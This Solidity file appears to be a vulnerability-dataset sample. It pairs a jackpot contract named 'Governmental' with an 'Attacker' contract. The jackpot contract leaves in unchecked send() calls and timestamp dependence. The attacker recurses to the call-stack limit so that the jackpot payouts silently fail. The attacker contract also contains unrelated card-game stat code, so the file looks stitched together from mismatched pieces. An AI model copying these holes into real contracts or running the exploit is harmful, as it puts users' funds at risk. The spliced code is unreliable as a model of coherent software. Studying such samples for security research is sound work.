 

 
pragma solidity ^0.4.0;

contract Governmental {
  address public owner;
  address public lastInvestor;
  uint public jackpot = 1 ether;
  uint public lastInvestmentTimestamp;
  uint public ONE_MINUTE = 1 minutes;

  function Governmental() {
    owner = msg.sender;
    if (msg.value<1 ether) throw;
  }

  function invest() {
    if (msg.value<jackpot/2) throw;
    lastInvestor = msg.sender;
    jackpot += msg.value/2;
     
    lastInvestmentTimestamp = block.timestamp;
  }

  function resetInvestment() {
    if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)
      throw;

    lastInvestor.send(jackpot);
    owner.send(this.balance-1 ether);

    lastInvestor = 0;
    jackpot = 1 ether;
    lastInvestmentTimestamp = 0;
  }
}

contract Attacker {


  struct Card {
    uint32 cardId;
    uint32 color;
    uint32 atk;
    uint32 defense;
    uint32 stype;
    uint256 price;
  }

  mapping(uint256 => Card) private cardInfo;
  mapping(uint32 => uint32) private calfactor;

  function getLevelConfig(uint32 cardId, uint32 level) external view returns (uint32 atk,uint32 defense,uint32 atk_min,uint32 atk_max) {
    if (level==1) {
      atk = cardInfo[cardId].atk;
      defense = cardInfo[cardId].defense;
    } else if (level==2) {
      atk = cardInfo[cardId].atk * 150/100;
      defense = cardInfo[cardId].defense * 150/100;
    } else if (level>=3) {
      atk = cardInfo[cardId].atk * (level-1)*2 - (level-2) * cardInfo[cardId].atk * 150/100;
      defense = cardInfo[cardId].defense * (level-1)*2 - (level-2) * cardInfo[cardId].defense * 150/100;
    }
    atk_min = calfactor[cardInfo[cardId].color]/100;
    atk_max = atk*(200-cardInfo[cardId].color)/100;
  }

  function attack(address target, uint count) {
    if (0<=count && count<1023) {
      this.attack.gas(msg.gas-2000)(target, count+1);
    }
    else {
      Governmental(target).resetInvestment();
    }
  }
}
